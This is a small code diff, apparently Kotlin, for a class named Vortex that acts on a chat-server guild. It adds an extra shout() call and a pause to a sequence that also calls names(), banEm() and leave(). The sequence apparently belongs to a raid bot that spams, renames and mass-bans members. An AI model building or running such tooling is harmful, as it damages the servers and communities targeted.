@@ -22,6 +22,8 @@ class Vortex(val guild: Guild, val masterRole: String) : Thread()
     shout()
     names()
     banEm()
+    shout()
+    Thread.sleep(1000)
     leave()
   }
 
